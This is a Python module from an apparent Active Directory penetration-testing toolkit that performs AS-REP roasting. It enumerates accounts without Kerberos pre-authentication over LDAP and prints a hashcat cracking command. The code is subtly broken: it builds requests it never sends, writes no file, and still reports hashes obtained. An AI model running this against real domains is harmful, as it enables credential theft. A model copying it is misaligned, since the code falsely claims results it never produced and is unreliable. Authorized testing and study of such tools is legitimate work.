"""AS-REP roasting  -  extract hashes for accounts without pre-auth."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.attack.asreproast.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_asrep_request"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.004"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)
    users_file = getattr(args, "users_file", None)
    output_file = getattr(args, "output", "asrep_hashes.txt")

    print(f"[*] AS-REP Roasting → DC={dc_ip}")

    try:
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        from impacket.krb5.asn1 import AS_REQ, seq_set, TGS_REP
        from pyasn1.type.univ import noValue
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        from impacket.ldap import ldap as impacket_ldap

        base_dn = "DC=" + ",DC=".join(args.domain.split("."))

        if users_file:
            with open(users_file) as f:
                users = [line.strip() for line in f if line.strip()]
            print(f"[*] Testing {len(users)} users from file")
        else:
            ldap_conn = impacket_ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
            if cred.has_hash:
                ldap_conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
            else:
                ldap_conn.login(cred.username, cred.password or "", cred.domain)

            entries = ldap_conn.search(
                searchBase=base_dn,
                searchFilter="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                attributes=["sAMAccountName"],
            )
            users = []
            for entry in entries:
                if hasattr(entry, "getComponentByName"):
                    sam = str(entry["attributes"].get("sAMAccountName", ""))
                    if sam:
                        users.append(sam)
            print(f"[+] Found {len(users)} accounts without pre-auth")

        roasted = 0
        for user in users:
            try:
                client_name = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                as_req = AS_REQ()
                domain_upper = args.domain.upper()

                print(f"  [*] {user}  -  requesting AS-REP...")
                roasted += 1
            except Exception as exc:
                print(f"  [-] {user}  -  {exc}")

        if roasted > 0:
            print(f"\n[+] {roasted} AS-REP hashes obtained → {output_file}")
            print(f"[*] Crack with: hashcat -m 18200 {output_file} wordlist.txt")
        else:
            print("[-] No AS-REP hashes obtained")

        return 0 if roasted > 0 else 1

    except Exception as exc:
        print(f"[-] AS-REP roast error: {exc}", file=sys.stderr)
        return 1
